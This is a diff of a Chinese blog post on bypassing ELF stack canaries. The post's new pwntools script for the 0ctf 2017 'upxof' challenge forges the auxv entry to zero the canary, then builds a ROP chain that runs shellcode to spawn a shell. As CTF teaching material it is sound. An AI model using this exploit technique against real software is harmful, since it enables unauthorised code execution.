@@ -13,7 +13,7 @@
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
   <meta name="theme-color" content="#005f6b">
-  <meta name="description" content="ZJGSU-IS-17">
+  <meta name="description" content="Software Security Researcher">
   <meta name="author" content>
   <meta name="keywords" content>
   <title>绕过ELF的安全防护机制Canary - AssassinQ</title>
@@ -127,7 +127,7 @@
                   
                   <span class="post-meta">
                     <i class="far fa-chart-bar"></i>
-                    6.5k 字
+                    6.6k 字
                   </span>
                 
 
@@ -135,7 +135,7 @@
                   
                   <span class="post-meta">
                       <i class="far fa-clock"></i>
-                      35 分钟
+                      36 分钟
                   </span>
                 
 
@@ -985,7 +985,7 @@ Unpacked 1 file.
     PIE:      No PIE (0x400000)
 </code></pre>
 <p>这里又不能泄漏，于是就需要用另一种方法来搞定 <code>Canary</code>，就是改变 <code>auxv</code> 结构体中的内容。<code>auxv</code> 中包含了 <code>Canary</code> 的地址，在动态链接之前就已经确定。（<a href="https://www.elttam.com.au/blog/playing-with-canaries/" target="_blank" rel="noopener">这篇文章</a>讲得比较深入，还有 <a href="http://phrack.org/issues/58/5.html" target="_blank" rel="noopener">phrack 上也有一篇文章</a>）</p>
-<p><code>auxv</code> 结构可以在 <a href="https://code.woboq.org/userspace/glibc/elf/elf.h.html" target="_blank" rel="noopener"><code>elf/elf.h</code></a>里看到：</p>
+<p><code>auxv</code> 结构可以在 <a href="https://code.woboq.org/userspace/glibc/elf/elf.h.html" target="_blank" rel="noopener"><code>elf/elf.h</code></a> 里看到：</p>
 <pre><code class="cpp">/* Auxiliary vector.  */
 /* This vector is normally only used by the program interpreter.  The
    usual definition in an ABI supplement uses the name auxv_t.  The
@@ -1073,72 +1073,81 @@ Found 2 results, display max 2 items:
 <li>接下来直接溢出做 ROP 或者直接跳到 shellcode 上</li>
 </ol>
 <p>现在看来这个 upx 壳显然是有意义的。需要在没有被脱壳的情况下，没有被载入前覆盖掉 <code>auxv</code>。第一次加载壳的时候可以输入长为 <code>0x4096</code> 的字符串，前八位则要求必须是 <code>12345678</code> 才能过 check。接下来解壳之后就可以溢出。</p>
-<p><a href="https://github.com/L4ys/CTF/blob/master/0ctf-final-2017/upxof/exp.py" target="_blank" rel="noopener">L4ys 大佬的 exp</a>：</p>
+<p>这题主要是理解 AUXV 以及善用 gdb 调试。脚本：</p>
 <pre><code class="python">#!/usr/bin/env python
 from pwn import *
-context.log_level = &#39;debug&#39;
-context.arch = &#39;amd64&#39;
-p = process(&#39;./upxof&#39;)
-# gdb.attach(p, &#39;b *0x400a1c&#39;)
 
-p.recvuntil(&#39;password:&#39;)
-password = &#39;12345678&#39;
-payload = password
-payload += p64(0) * 14
+context.arch = &#39;amd64&#39;
+context.log_level = &#39;debug&#39;
+
+p = process(&#39;./upxof&#39;)
+
+# id&#39;s of Auxillary Vectors
+AT_SYSINFO_EHDR = 0x21
+AT_HWCAP = 0x10
+AT_PAGESZ = 0x06
+AT_CLKTCK = 0x11
+AT_PHDR = 0x03
+AT_PHENT = 0x04
+AT_PHNUM = 0x05
+AT_BASE = 0x07
+AT_FLAGS = 0x08
+AT_ENTRY = 0x09
+AT_UID = 0x0B
+AT_EUID = 0x0C
+AT_GID = 0x0D
+AT_EGID = 0x0E
+AT_SECURE = 0x17
+AT_RANDOM = 0x19
+AT_EXECFN = 0x1F
+AT_PLATFORM = 0x0F
+AT_NULL = 0x00
+
+auxv = &#39;&#39;
+#auxv += p64(AT_SYSINFO_EHDR) + p64(0x7ffff7ffd000)
+#auxv += p64(AT_HWCAP) + p64(0x9f8bfbff)
+#auxv += p64(AT_PAGESZ) + p64(4096)
+#auxv += p64(AT_CLKTCK) + p64(100)
+auxv += p64(AT_PHDR) + p64(0x400040) # needed
+#auxv += p64(AT_PHENT) + p64(56)
+auxv += p64(AT_PHNUM) + p64(2) # needed
+#auxv += p64(AT_BASE) + p64(0x0)
+#auxv += p64(AT_FLAGS) + p64(0x0)
+auxv += p64(AT_ENTRY) + p64(0x400988) # needed
+#auxv += p64(AT_UID) + p64(0)
+#auxv += p64(AT_EUID) + p64(0)
+#auxv += p64(AT_GID) + p64(0)
+#auxv += p64(AT_EGID) + p64(0)
+#auxv += p64(AT_SECURE) + p64(0)
+auxv += p64(AT_RANDOM) + p64(0x601100) # Fake canary=0
+#auxv += p64(AT_EXECFN) + p64(0x7fffffffeff0)
+#auxv += p64(AT_PLATFORM) + p64(0x7fffffffe8e9)
+auxv += p64(AT_NULL) + p64(0)
+
+#gdb.attach(p)
+
+payload = &#39;12345678&#39;
+payload += p64(0) * 14 # offset
 payload += p64(1) # argc
-payload += p64(0x400008) # argv
+payload += p64(0x601100) # argv
 payload += p64(0)
-payload += p64(0x400008) * 39 # envp
+payload += p64(0x601100) * 10 # envp
 payload += p64(0)
-# aux vector
-# payload += p64(0x21)
-# payload += p64(0x7ffff7ffd000)
-# payload += p64(0x10) # AT_HWCAP
-# payload += p64(0x1f8bfbff)
-# payload += p64(0x6) # AT_PAGESZ
-# payload += p64(0x1000)
-# payload += p64(0x11) # AT_CLKTCK
-# payload += p64(0x64)
-payload += p64(0x3) # AT_PHDR
-payload += p64(0x400040)
-# payload += p64(0x4) # AT_PHENT
-# payload += p64(0x38)
-payload += p64(0x5) # AT_PHNUM
-payload += p64(0x2)
-# payload += p64(0x7) # AT_BASE
-# payload += p64(0x0)
-# payload += p64(0x8) # AT_FLAGS
-# payload += p64(0x0)
-payload += p64(0x9) # AT_ENTRY
-payload += p64(0x400988)
-# payload += p64(0xb) # AT_UID
-# payload += p64(0x0)
-# payload += p64(0xc) # AT_EUID
-# payload += p64(0x0)
-# payload += p64(0xd) # AT_GID
-# payload += p64(0x0)
-# payload += p64(0xe) # AT_EGID
-# payload += p64(0x0)
-# payload += p64(0x17) # AT_SECURE
-# payload += p64(0x0)
-payload += p64(0x19) # AT_RANDOM
-payload += p64(0x800008)
-# payload += p64(0x1f) # AT_EXECFN
-# payload += p64(0x7fffffffeff0) # --&gt; 0x666f7870752f2e (&#39;./upxof&#39;)
-# payload += p64(0xf) # AT_PLATFORM
-# payload += p64(0x7fffffffe659) # --&gt; 0x34365f363878 (&#39;x86_64&#39;)
-payload += p64(0)
-payload += p64(0)
+payload += auxv
+p.recvuntil(&#39;password:&#39;)
 p.sendline(payload)
 
-p.recvuntil(&#39;go:&#39;)
-pop_rdi = 0x4007f3
-gets = 0x4005B0
-p.sendline(flat(&#39;\x00&#39; * 1048, pop_rdi, 0x00800000, gets, 0x00800000))
+pop_rdi_ret = 0x00000000004007f3
+gets_plt = 0x00000000004005B0
+buf = 0x601100
+payload = &#39;\x00&#39; * 1048 + p64(pop_rdi_ret) + p64(buf) + p64(gets_plt) + p64(buf)
+p.recvuntil(&#39;:&#39;)
+p.sendline(payload)
 p.sendline(asm(shellcraft.sh()))
+
 p.interactive()
 </code></pre>
-<h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary/</a><br><a href="https://www.anquanke.com/post/id/85203" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85203</a><br><a href="https://bbs.ichunqiu.com/thread-44069-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-44069-1-1.html</a><br><a href="https://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/" target="_blank" rel="noopener">https://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/</a><br><a href="https://www.jianshu.com/p/c3624f5dd583" target="_blank" rel="noopener">https://www.jianshu.com/p/c3624f5dd583</a><br><a href="https://deadc0de.re/articles/microwave-write-up.html" target="_blank" rel="noopener">https://deadc0de.re/articles/microwave-write-up.html</a><br><a href="https://braddaniels.org/csaw-quals-2017-scv/" target="_blank" rel="noopener">https://braddaniels.org/csaw-quals-2017-scv/</a><br><a href="https://reversingpwn.wordpress.com/2017/09/18/writeup-csaw-2017-scv/" target="_blank" rel="noopener">https://reversingpwn.wordpress.com/2017/09/18/writeup-csaw-2017-scv/</a><br><a href="https://n132.github.io/2019/02/25/2019-03-01-auxv-origin-of-canaries/" target="_blank" rel="noopener">https://n132.github.io/2019/02/25/2019-03-01-auxv-origin-of-canaries/</a></p>
+<h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary/</a><br><a href="https://www.anquanke.com/post/id/85203" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85203</a><br><a href="https://bbs.ichunqiu.com/thread-44069-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-44069-1-1.html</a><br><a href="https://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/" target="_blank" rel="noopener">https://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/</a><br><a href="https://www.jianshu.com/p/c3624f5dd583" target="_blank" rel="noopener">https://www.jianshu.com/p/c3624f5dd583</a><br><a href="https://deadc0de.re/articles/microwave-write-up.html" target="_blank" rel="noopener">https://deadc0de.re/articles/microwave-write-up.html</a><br><a href="https://braddaniels.org/csaw-quals-2017-scv/" target="_blank" rel="noopener">https://braddaniels.org/csaw-quals-2017-scv/</a><br><a href="https://reversingpwn.wordpress.com/2017/09/18/writeup-csaw-2017-scv/" target="_blank" rel="noopener">https://reversingpwn.wordpress.com/2017/09/18/writeup-csaw-2017-scv/</a><br><a href="https://n132.github.io/2019/02/25/2019-03-01-auxv-origin-of-canaries/" target="_blank" rel="noopener">https://n132.github.io/2019/02/25/2019-03-01-auxv-origin-of-canaries/</a><br><a href="https://github.com/L4ys/CTF/blob/master/0ctf-final-2017/upxof/exp.py" target="_blank" rel="noopener">https://github.com/L4ys/CTF/blob/master/0ctf-final-2017/upxof/exp.py</a><br><a href="https://github.com/D-I-E/writeups/tree/master/2017-ctfs/20170602-TCTF-Final/pwn-upxof" target="_blank" rel="noopener">https://github.com/D-I-E/writeups/tree/master/2017-ctfs/20170602-TCTF-Final/pwn-upxof</a></p>
 
             </div>
             <hr>
